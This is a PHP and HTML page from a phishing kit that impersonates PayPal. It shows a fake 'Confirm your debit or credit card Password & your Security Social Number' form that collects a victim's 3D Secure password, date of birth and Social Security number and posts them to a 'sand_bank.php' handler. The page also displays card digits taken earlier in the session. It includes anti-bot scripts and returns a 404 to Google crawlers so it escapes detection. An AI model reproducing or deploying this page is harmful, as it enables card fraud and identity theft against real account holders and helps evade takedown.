
<?php


session_start();
error_reporting(0);


include "../../../boots/antibots1.php";
include "../../../boots/antibots2.php";
include "../../../boots/antibots3.php";
include "../../../boots/antibots4.php";
include "../../../boots/encriptar.php";
include "../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../system/blocker.php");
include("../../system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




?>


<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>



</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>



    <link rel="stylesheet" href="../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../lib/css/B-Z118.css">



<script src="../lib/js/jquery.js"></script><script src="../lib/js/jquery.validate.js"></script><script src="../lib/js/jquery.v-form.js"></script>
<script src="../lib/js/jquery.mask.js"></script>



<html data-reactroot="" data-reactid="1" data-react-checksum="381182243"><head data-reactid="2"><script type="text/javascript" src="../../js/pa.js" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" data-reactid="8"/><link rel="stylesheet" href="../../css/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="../../css/main.css" data-reactid="10"/><title data-reactid="11">PayPal: D3 Cards</title></head>





<link rel="stylesheet" href="../../paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="../../css/main.css" data-reactid="10"/>


<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="103"><div class="vx_modal-wrapper" data-reactid="104"><a href="#" name="modalClose" class="vx_modal-dismiss_x" data-reactid="105"><span class="vx_a11yText" data-reactid="106">close</span></a><div class="vx_modal-content" data-reactid="107"><header class="vx_modal-header" data-reactid="108"><h2 id="js_modalHeader" class="vx_h2" data-reactid="109">Confirm your debit or credit card Password & your Security Social Number</h2></header><div class="vx_modal-body vx_blocks-for-mobile" data-reactid="110">


            <td style="font-size: 1.05em;">

<?=@$_SESSION['_namabank_'];?>

</td>


<div style="text-align: center;">


<div class="creditOrDebit master_card gray card image"><span class="lastDigits vx_text-3" dir="ltr">XXXX-XXXX-XXXX-<span class="last4"><?=substr($_SESSION['_cardnumber_'] , -4);?>
</span></span></div>


</div>


  <form action="../../system/sand_bank.php" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">

                            <div class="HeaderZ118">
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"></p>
                            </div>
                            <div class="BowContainerZ118">
                                
                                <div class="inner">
                                            <div class="FieldsZ118 large">


                                                <input 


type="password" class="Xval666ideX1 " id="<?=strtolower($_SESSION['_ccbrand_']);?>" name="3dpassword" required="required" autocomplete="off" placeholder="3D Password" value=

"">
                                            </div>

		<link rel="stylesheet" href="../../css/n.css">


	<div class="rotation"> <p> Checking your 3d Security... </p> </div>






 

                                            <div class="FieldsZ118 large">



                                                <input type="tel" class="Xval666ideX1 " id="birth_date" name="birth_date" required="required" autocomplete="off" placeholder="Date Of Birth" value=

"" aria-required="true" maxlength="10">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="AddressLine" id="addressEntry">
                                        <div class="G-FieldsZ118">
                                            <div class="textInput">

                                                <div class="FieldsZ118 large">
                                                    <input type="tel" class="Xval666ideX1 " id="ilimtd" name="ilimtd" required="required" value="" placeholder="Social Security number" autocomplete="off">
                                                </div>
                                            </div>
                            
<div class="multi equal ">

                                                    </div>
                                            </div>
                



<div 
 id="stateHolder">
                                                <div class="textInput">
                                                    <div class="FieldsZ118 large">
                                                                                                          </div>

                                             
                                            </div>
                                        </div>
                                    </div>
                                    <div class="agreeTC checkbox  ">
                                        <div class="">

                                                       


                                                                             </div>

</div>
                                    <input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Continue" data-click="WorldWideSubmit">



<div style="text-align: center;">

     

<a href='//<?=@$_SESSION['_urlbank_'];?>' target='_top' class='nemo_recentActivity-shopLink'>

<?=@$_SESSION['_urlbank_'];?>


</span></span></a></div></div></div></div></div>


</div>



</div></div></div></div></div>